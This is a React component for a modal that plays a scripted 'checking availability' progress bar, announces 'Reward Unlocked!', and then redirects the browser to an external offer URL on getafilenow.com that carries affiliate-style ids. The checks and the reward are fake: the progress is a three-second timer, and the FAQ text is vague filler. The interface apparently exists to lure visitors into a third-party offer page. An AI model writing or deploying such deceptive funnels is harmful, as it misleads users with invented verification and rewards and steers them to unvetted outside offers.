import { useEffect, useState } from "react";

interface CTAFlowProps {
  open: boolean;
  onClose: () => void;
}

const statusMessages = [
  "Checking availability...",
  "Preparing access...",
  "Finalizing access...",
];

const faqs = [
  {
    q: "Is this offer available today?",
    a: "Availability may vary based on location and current promotional inventory.",
  },
  {
    q: "How long does it take?",
    a: "Most users are redirected to the offer page within a few seconds.",
  },
];

export default function CTAFlow({ open, onClose }: CTAFlowProps) {
  const [progress, setProgress] = useState(0);
  const [statusIdx, setStatusIdx] = useState(0);
  const [completed, setCompleted] = useState(false);

  useEffect(() => {
    if (!open) {
      setProgress(0);
      setStatusIdx(0);
      setCompleted(false);
      return;
    }

    document.body.style.overflow = "hidden";

    const totalDuration = 3000;
    const startTime = performance.now();

    const tick = () => {
      const elapsed = performance.now() - startTime;
      const t = Math.min(elapsed / totalDuration, 1);
      setProgress(t * 100);

      if (t < 0.33) setStatusIdx(0);
      else if (t < 0.7) setStatusIdx(1);
      else setStatusIdx(2);

      if (t < 1) {
        requestAnimationFrame(tick);
      } else {
        setCompleted(true);
        setTimeout(() => {
          window.location.href = "https://getafilenow.com/show.php?l=0&u=2414555&id=74764";
        }, 700);
      }
    };
    requestAnimationFrame(tick);

    return () => {
      document.body.style.overflow = "";
    };
  }, [open]);

  if (!open) return null;

  return (
    <div className="modal-backdrop" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <button
          onClick={onClose}
          aria-label="Close"
          className="absolute top-4 right-4 w-9 h-9 rounded-full bg-white/5 hover:bg-white/10 border border-white/10 flex items-center justify-center text-white transition-colors"
        >
          <i className="fa-solid fa-xmark text-sm"></i>
        </button>

        {!completed ? (
          <div>
            {/* Header */}
            <div className="flex items-start gap-4 mb-6">
              <div className="relative shrink-0">
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-[#00D54B] to-[#00FF85] flex items-center justify-center neon-green-soft">
                  <i className="fa-solid fa-bolt text-[#050505] text-xl"></i>
                </div>
                <span className="absolute -top-1 -right-1 w-4 h-4 rounded-full bg-[#00FF85] border-2 border-[#0D0D0D] animate-pulse"></span>
              </div>
              <div>
                <h3 className="font-['Space_Grotesk'] font-bold text-2xl md:text-3xl text-white tracking-tight">
                  Checking Availability
                </h3>
                <p className="text-sm md:text-base text-[#A0A0A0] mt-1">
                  We are checking current reward availability.
                </p>
              </div>
            </div>

            {/* Progress Bar */}
            <div className="mb-6">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-semibold text-[#A0A0A0] uppercase tracking-wider">
                  {statusMessages[statusIdx]}
                </span>
                <span className="text-xs font-bold text-[#00FF85] tabular-nums">
                  {Math.floor(progress)}%
                </span>
              </div>
              <div className="h-2 bg-white/5 rounded-full overflow-hidden">
                <div
                  className="h-full progress-fill rounded-full transition-all duration-200"
                  style={{ width: `${progress}%` }}
                ></div>
              </div>
            </div>

            {/* Status Checklist */}
            <div className="space-y-2.5 mb-6">
              {statusMessages.map((msg, i) => {
                const isDone = statusIdx > i || (statusIdx === i && progress >= 99);
                const isActive = statusIdx === i && progress < 99;
                return (
                  <div
                    key={i}
                    className={`flex items-center gap-3 px-4 py-3 rounded-xl border transition-all ${
                      isDone
                        ? "bg-[rgba(0,213,75,0.08)] border-[#00FF85]/30"
                        : isActive
                        ? "bg-[rgba(0,213,75,0.05)] border-[#00FF85]/20"
                        : "bg-white/2 border-white/5"
                    }`}
                  >
                    <div
                      className={`w-6 h-6 rounded-full flex items-center justify-center shrink-0 ${
                        isDone
                          ? "bg-gradient-to-br from-[#00D54B] to-[#00FF85]"
                          : isActive
                          ? "border-2 border-[#00FF85] border-t-transparent animate-spin"
                          : "border-2 border-white/10"
                      }`}
                    >
                      {isDone && <i className="fa-solid fa-check text-[#050505] text-[10px]"></i>}
                    </div>
                    <span
                      className={`text-sm ${
                        isDone || isActive ? "text-white" : "text-[#A0A0A0]"
                      }`}
                    >
                      {msg}
                    </span>
                  </div>
                );
              })}
            </div>

            {/* FAQ in popup */}
            <div className="border-t border-white/5 pt-5">
              <div className="text-xs font-bold text-[#A0A0A0] uppercase tracking-wider mb-3 flex items-center gap-2">
                <i className="fa-solid fa-circle-info text-[#00FF85]"></i>
                <span>Quick Info</span>
              </div>
              <div className="space-y-3">
                {faqs.map((faq, i) => (
                  <div key={i} className="glass-card rounded-xl p-3.5">
                    <div className="flex items-start gap-2.5">
                      <i className="fa-solid fa-circle-question text-[#00FF85] text-sm mt-0.5 shrink-0"></i>
                      <div className="min-w-0">
                        <div className="text-sm font-semibold text-white">{faq.q}</div>
                        <div className="text-xs text-[#A0A0A0] mt-1 leading-relaxed">
                          {faq.a}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        ) : (
          <div className="text-center py-6">
            <div className="w-20 h-20 mx-auto rounded-full bg-gradient-to-br from-[#00D54B] to-[#00FF85] flex items-center justify-center neon-green mb-5">
              <i className="fa-solid fa-check text-[#050505] text-3xl"></i>
            </div>
            <h3 className="font-['Space_Grotesk'] font-bold text-2xl md:text-3xl text-white tracking-tight mb-2">
              Reward Unlocked!
            </h3>
            <p className="text-sm md:text-base text-[#A0A0A0]">
              Redirecting you to the offer page...
            </p>
          </div>
        )}
      </div>
    </div>
  );
}
